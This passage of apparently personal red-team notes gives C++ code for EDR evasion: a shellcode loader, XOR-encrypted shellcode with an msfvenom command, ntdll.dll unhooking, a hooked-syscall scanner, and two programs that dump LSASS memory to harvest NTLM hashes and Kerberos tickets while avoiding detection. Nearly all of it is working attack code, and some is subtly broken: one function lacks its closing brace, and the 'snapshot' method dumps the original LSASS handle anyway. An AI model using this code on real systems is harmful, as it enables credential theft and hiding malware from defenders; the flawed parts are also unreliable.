    auto pCreateThread = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))ResolveFunctionByHash(hKernel32, hashCreateThread);
    auto pWaitForSingleObject = (DWORD(WINAPI*)(HANDLE, DWORD))ResolveFunctionByHash(hKernel32, hashWaitForSingleObject);

    if (!pVirtualAlloc || !pCreateThread || !pWaitForSingleObject) {
        std::cerr << "Failed to resolve one or more functions." << std::endl;
        return -1;
    }

    // Allocate memory for shellcode
    LPVOID execMem = pVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        std::cerr << "VirtualAlloc failed." << std::endl;
        return -1;
    }

    // Copy shellcode to allocated memory
    memcpy(execMem, shellcode, sizeof(shellcode));

    // Execute shellcode
    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "CreateThread failed." << std::endl;
        return -1;
    }

    // Wait for shellcode to finish
    pWaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

---

# 4. Some Basic Offensive Techniques
### 4.1 XOR-encrypted shellcode
Simple and effective, it's an encryption method to perform a XOR operation on each byte of the payload to inject with a predefined key.
Effective against static analysis but could be detected by heuristic and behavioural monitoring.
1. Generate a shellcode with `msfvenom` or `Donut`. 
   `msfvenom -p windows/x64/messagebox TEXT="Hello" -f c`
2. Generate a `encrypted_payload.h` with `encryptor.cpp` :
	```cpp
	#include <iostream>
	#include <fstream>
	#include <vector>
	#include <string>
	
	// XOR encryption key
	const std::string key = "redteamexercises";
	
	// Raw shellcode
	unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
	                            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52";
	
	const size_t shellcode_size = sizeof(shellcode);
	
	// XOR encryption function
	void xor_encrypt(std::vector<unsigned char>& data, const std::string& key) {
	    for (size_t i = 0; i < data.size(); i++) {
	        data[i] ^= key[i % key.size()];
	    }
	}
	
	int main() {
	    std::vector<unsigned char> encrypted(shellcode, shellcode + shellcode_size);
	    xor_encrypt(encrypted, key);
	
	    std::ofstream output("encrypted_shellcode.h");
	    output << "#pragma once\n";
	    output << "unsigned char encrypted_shellcode[] = {";
	    for (size_t i = 0; i < encrypted.size(); i++) {
	        output << "0x" << std::hex << (int)encrypted[i];
	        if (i != encrypted.size() - 1) output << ", ";
	    }
	    output << "};\n";
	    output << "const size_t shellcode_size = " << encrypted.size() << ";\n";
	    std::cout << "[+] Encrypted shellcode saved to encrypted_shellcode.h\n";
	    return 0;
	}
	
	```
3. Run the `runner.cpp` to run the encrypted payload:
   ```cpp
	#include <windows.h>
	#include <iostream>
	#include "encrypted_shellcode.h" // Include generated header
	
	const std::string key = "redteamexercises";
	
	// Decryption logic
	void xor_decrypt(unsigned char* data, size_t size, const std::string& key) {
	    for (size_t i = 0; i < size; i++) {
	        data[i] ^= key[i % key.size()];
	    }
	}
	
	int main() {
	    std::cout << "[+] Starting shellcode decryption and execution...\n";
	
	    xor_decrypt(encrypted_shellcode, shellcode_size, key);
	
	    void* exec_mem = VirtualAlloc(nullptr, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	    if (!exec_mem) {
	        std::cerr << "[-] Memory allocation failed\n";
	        return 1;
	    }
	
	    memcpy(exec_mem, encrypted_shellcode, shellcode_size);
	
	    DWORD oldProtect;
	    if (!VirtualProtect(exec_mem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect)) {
	        std::cerr << "[-] Failed to change memory permissions\n";
	        return 1;
	    }
	
	    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec_mem, nullptr, 0, nullptr);
	    if (!hThread) {
	        std::cerr << "[-] Thread creation failed\n";
	        return 1;
	    }
	
	    WaitForSingleObject(hThread, INFINITE);
	    return 0;
	}

	```

### 4.2 Unhooking `ntdll.dll` (restoring `.text` section)
##### About
As I discussed in the [Objectives](#0-objectives) section about hooking/unhooking, it is "breaking" the link between the EDR and the Windows APIs so we can can and use them without being detected. 
The thing about these **inline hooks** is that they are typically injected in the `.text` section. So we can restore a copy of the clean copy `ntdll.dll` from disk and replacing its `.text` section.
##### Code
1. Load a clean copy of ntdll.dll from the disk.
2. Parse the PE headers for both ntdll.dll copies (in-memory and on-disk).
3. Locate the `.text` section.(where syscall stubs are stored)
4. Temporarily make the `.text` section writable using `VirtualProtect` or `NtProctectVirtualMemory`.
5. Overwrite the hooked memory region with the clean version.
6. Restore the memory protections to preserve normal behavior.

```cpp

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <fstream>

// Gets RVA and size of the .text section
bool GetTextSectionInfo(BYTE* moduleBase, DWORD& rva, DWORD& size) {
    auto dos = (IMAGE_DOS_HEADER*)moduleBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    auto nt = (IMAGE_NT_HEADERS*)(moduleBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    auto section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (strncmp((char*)section->Name, ".text", 5) == 0) {
            rva  = section->VirtualAddress;
            size = section->Misc.VirtualSize;
            return true;
        }
        ++section;
    }

    return false;
}

// Loads ntdll.dll from disk into memory buffer
std::vector<BYTE> LoadCleanNtdllFromDisk() {
    WCHAR systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);

    std::wstring fullPath = std::wstring(systemPath) + L"\\ntdll.dll";
    std::ifstream file(fullPath, std::ios::binary);

    if (!file) {
        std::cerr << "[-] Could not open ntdll.dll from disk.\n";
        return {};
    }

    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer(fileSize);
    file.read(reinterpret_cast<char*>(buffer.data()), fileSize);
    file.close();

    return buffer;
}

int main() {
    std::cout << "[+] Starting NTDLL unhooking...\n";

    // Get loaded ntdll base address
    BYTE* loadedNtdll = (BYTE*)GetModuleHandleW(L"ntdll.dll");
    if (!loadedNtdll) {
        std::cerr << "[-] Failed to get ntdll base address.\n";
        return 1;
    }

    // Get loaded .text RVA and size
    DWORD loadedRVA = 0, loadedSize = 0;
    if (!GetTextSectionInfo(loadedNtdll, loadedRVA, loadedSize)) {
        std::cerr << "[-] Failed to get .text info from loaded ntdll.\n";
        return 1;
    }

    BYTE* loadedTextBase = loadedNtdll + loadedRVA;
    std::cout << "[+] .text in memory: " << static_cast<void*>(loadedTextBase)
              << " | Size: " << loadedSize << "\n";

    // Load clean copy from disk
    std::vector<BYTE> cleanNtdll = LoadCleanNtdllFromDisk();
    if (cleanNtdll.empty()) return 1;

    // Get clean .text RVA and size
    DWORD cleanRVA = 0, cleanSize = 0;
    if (!GetTextSectionInfo(cleanNtdll.data(), cleanRVA, cleanSize)) {
        std::cerr << "[-] Failed to get .text info from clean ntdll.\n";
        return 1;
    }

    std::cout << "[+] .text in clean ntdll at RVA: 0x" << std::hex << cleanRVA
              << " | Size: " << std::dec << cleanSize << "\n";

    if (cleanSize != loadedSize) {
        std::cerr << "[-] .text size mismatch between disk and memory.\n";
        return 1;
    }

    if ((cleanRVA + cleanSize) > cleanNtdll.size()) {
        std::cerr << "[-] Clean .text section exceeds file size bounds.\n";
        return 1;
    }

    BYTE* cleanTextBase = cleanNtdll.data() + cleanRVA;

    // Change protection to RWX
    DWORD oldProtect = 0;
    if (!VirtualProtect(loadedTextBase, loadedSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cerr << "[-] Failed to change memory protection.\n";
        return 1;
    }

    std::cout << "[+] Patching .text section in memory...\n";

    // Overwrite with clean .text
    memcpy(loadedTextBase, cleanTextBase, loadedSize);

    // Flush CPU instruction cache (important after patching syscall stubs)
    FlushInstructionCache(GetCurrentProcess(), loadedTextBase, loadedSize);

    // Restore original protection
    DWORD tempProtect;
    if (!VirtualProtect(loadedTextBase, loadedSize, oldProtect, &tempProtect)) {
        std::cerr << "[-] Failed to restore memory protection.\n";
        return 1;
    }

    std::cout << "[+] Unhook complete. NTDLL restored from disk.\n";
    return 0;
}
```

### 4.3 Detecting Hooked Syscalls in NTDLL
##### About
This is how it is going to work:
1. Load the NTDLL export directory.
2. Iterate over functions starting with `Nt` or `Zw`.
3. Resolve the function address in memory.
4. Read and compare the first 4-5 bytes of the function with known syscall prologues like `4C 8B D1 B8` or look for redirection patterns.
This technique is useful:
- Before executing any direct or indirect syscalls to ensure that `ntdll` is clean.
- To verify that an unhooking routine worked correctly.
Cons:
- Doesn't check for total API re-implementations.
- Limited to inline hooks on `ntdll.dll` and doesn't look for IAT or SSDT hooks.
##### Code
```cpp
#include <Windows.h>
#include <Psapi.h>
#include <iostream>
#include <string>

#pragma comment(lib, "Psapi.lib")

int main()
{
    // Load the in-memory NTDLL module
    HMODULE ntdllBase = LoadLibraryA("ntdll.dll");
    if (!ntdllBase) {
        std::cerr << "[-] Failed to load ntdll.dll" << std::endl;
        return 1;
    }

    // Read the PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)ntdllBase + dosHeader->e_lfanew);

    // Locate the export directory
    DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ntdllBase + exportRVA);

    // Resolve export tables
    PDWORD functionRVAs = (PDWORD)((BYTE*)ntdllBase + exportDir->AddressOfFunctions);
    PDWORD nameRVAs = (PDWORD)((BYTE*)ntdllBase + exportDir->AddressOfNames);
    PWORD ordinals = (PWORD)((BYTE*)ntdllBase + exportDir->AddressOfNameOrdinals);

    // Expected syscall stub prologue (mov r10, rcx; mov eax, syscall_id)
    const BYTE syscallPrologue[] = { 0x4C, 0x8B, 0xD1, 0xB8 };

    std::cout << "[+] Scanning ntdll.syscalls for inline hooks...\n";

    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        const char* functionName = (const char*)ntdllBase + nameRVAs[i];

        // Only scan Nt* and Zw* functions
        if (strncmp(functionName, "Nt", 2) != 0 && strncmp(functionName, "Zw", 2) != 0)
            continue;

        // Resolve function address
        WORD ordinal = ordinals[i];
        DWORD funcRVA = functionRVAs[ordinal];
        BYTE* funcAddress = (BYTE*)ntdllBase + funcRVA;

        // Compare first 4 bytes with clean syscall prologue
        if (memcmp(funcAddress, syscallPrologue, sizeof(syscallPrologue)) != 0)
        {
            // If first byte is 0xE9 (jmp), likely a trampoline
            if (funcAddress[0] == 0xE9)
            {
                DWORD relOffset = *(DWORD*)(funcAddress + 1);
                BYTE* jmpTarget = funcAddress + 5 + relOffset;

                char modulePath[MAX_PATH] = {};
                if (GetMappedFileNameA(GetCurrentProcess(), jmpTarget, modulePath, MAX_PATH)) {
                    std::cout << "[HOOKED] " << functionName << " at " << (void*)funcAddress
                              << " => JMP to " << (void*)jmpTarget
                              << " (Module: " << modulePath << ")\n";
                } else {
                    std::cout << "[HOOKED] " << functionName << " at " << (void*)funcAddress
                              << " => JMP to " << (void*)jmpTarget
                              << " (unknown module)\n";
                }
            }
            else {
                std::cout << "[SUSPICIOUS] " << functionName << " at " << (void*)funcAddress
                          << " has unexpected prologue\n";
            }
        }
    }

    std::cout << "[+] Scan completed.\n";
    return 0;
}
```
### LSASS Dumping
##### About
**LSASS** is a protected Windows process responsible for handling credential validation and access tokens. Dumping this process' memory can give us highly sensitive data: NTLM hashes, Kerberos tickets...etc which makes it a high value target. 
Tools like `ProcDump` or `Mimikatz` do it automatically, let's do it programmatically. [[PtT Windows|Here]] is more about Mimikatz.
#### Method 1:LSASS Dumping via `MiniDumpWriteDump`
##### About
`MiniDumpWriteDump` is a an officially supported Windows API function found in `dghelp.dll`
This API allows developers to take a snapshot of a target process. 
Although **highly monitored**, when applied to `lsass.exe` it can be exploited further using `Mimikatz` or `pypykatz`. This leads to more sophisticated approaches:
- Direct syscall variants.
- Forking and dumping child processes.
- Manual memory walking.
- `PssCaptureSnapshot`, discussed below.
Also this method requires the calling process to have the `SeDebugPrivilege` flag.
##### Code
Steps:
1. Enable `SeDebugPrivilege`.
2. Finding LSASS PID with a custom function.
3. Get a handle on the `lsass.exe` using `OpenProcess`.
4. Create a local file containing the process dump.
5. Analyse further with `Mimikatz`, `pypykatz` or `volatility/Rekall`

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <iostream>

#pragma comment(lib, "dbghelp.lib") // Link against the Debug Help Library

bool EnablePrivilege(LPCWSTR priv) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    if (!LookupPrivilegeValue(NULL, priv, &luid))
        return false;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

DWORD GetLsassPID() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, L"lsass.exe") == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    if (!EnablePrivilege(SE_DEBUG_NAME)) {
        std::cerr << "[-] Failed to enable SeDebugPrivilege.\n";
        return 1;
    }
    
	DWORD pid = GetLsassPID();
    if (pid == 0) {
        std::cerr << "[-] Could not find lsass.exe\n";
        return 1;
    }
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] Failed to open LSASS process.\n";
        return 1;
    }
    HANDLE hFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) {
        std::cerr << "[-] Failed to create dump file.\n";
        return 1;
    }
    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (success) {
        std::cout << "[+] Dump written to lsass.dmp\n";
    } else {
        std::cerr << "[-] Dump failed.\n";
    }

    CloseHandle(hFile);
    CloseHandle(hProcess);
    return 0;
}
```

#### Method2: LSASS Dumping via `PssCaptureSnapshot` and `MiniDumpWriteDump`
##### About
This is a way of evading the protections and monitoring EDRs implement to monitor the LSASS process. 
`PssCaptureSnapshot` is a Windows API function introduced in `Windows 8.1` and `Server 2012 R2`. It allows us to clone a target process instead of dumping its memory directly and right after cloning it we can dump its memory independently of the original process. 
**This technique might not be flagged by EDRs especially when the dump is written in a stealthy manner.**
##### Code
Here is how the technique works:
- `PssCaptureSnapshot` creates a read-only clone of the LSASS process containing all virtual memory pages without interfering with the original process.
- This is a way of avoiding traditional API patterns which are commonly detected and flagged.
- `MiniDumpWriteDump` can still be monitored by EDRs so there exist many techniques to avoid this monitoring:
	- Dumping to memory buffer and encrypting.
	- Named pipe exfiltration.
	- Using direct syscalls or indirect syscall wrappers for `MiniDumpWriteDump`.
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <processsnapshot.h>
#include <DbgHelp.h>

#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "kernel32.lib")

// Enables SE_DEBUG_NAME privilege in the current process token
bool EnablePrivilege(LPCWSTR privName) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    // Open current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    // Lookup LUID for the privilege
    if (!LookupPrivilegeValue(NULL, privName, &luid))
        return false;

    // Enable the privilege
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

// Enumerates all processes and finds the PID of lsass.exe
DWORD GetLsassPID() {
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return 0;
}

int main() {
    std::cout << "[+] Starting LSASS snapshot dump using PssCaptureSnapshot...\n";

    // Step 1: Enable SeDebugPrivilege
    if (!EnablePrivilege(SE_DEBUG_NAME)) {
        std::cerr << "[-] Failed to enable SeDebugPrivilege.\n";
        return 1;
    }

    // Step 2: Get LSASS process ID
    DWORD lsassPid = GetLsassPID();
    if (!lsassPid) {
        std::cerr << "[-] Could not find LSASS process.\n";
        return 1;
    }

    // Step 3: Open LSASS process with full access
    HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
    if (!hLsass) {
        std::cerr << "[-] Failed to open LSASS process.\n";
        return 1;
    }

    // Step 4: Capture snapshot using PssCaptureSnapshot
    HPSS snapshotHandle = nullptr;
    DWORD status = PssCaptureSnapshot(
        hLsass,
        PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION |
        PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT,
        CONTEXT_ALL,
        &snapshotHandle
    );

    if (status != ERROR_SUCCESS) {
        std::cerr << "[-] PssCaptureSnapshot failed. Error: " << status << "\n";
        CloseHandle(hLsass);
        return 1;
    }

    // Step 5: Create output file to write the memory dump
    HANDLE hFile = CreateFileW(L"lsass_pss.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to create dump file.\n";
        PssFreeSnapshot(GetCurrentProcess(), snapshotHandle);
        CloseHandle(hLsass);
        return 1;
    }

    // Step 6: Write memory dump using MiniDumpWriteDump (dump original handle)
    BOOL dumped = MiniDumpWriteDump(
        hLsass, lsassPid,
        hFile,
        MiniDumpWithFullMemory,
        NULL, NULL, NULL
    );

    if (!dumped) {
        std::cerr << "[-] MiniDumpWriteDump failed. Error: " << GetLastError() << "\n";
    } else {
        std::cout << "[+] Memory dump written successfully to lsass_pss.dmp\n";
    }

    // Step 7: Cleanup
    CloseHandle(hFile);
    PssFreeSnapshot(GetCurrentProcess(), snapshotHandle);
    CloseHandle(hLsass);

    return 0;
}

```



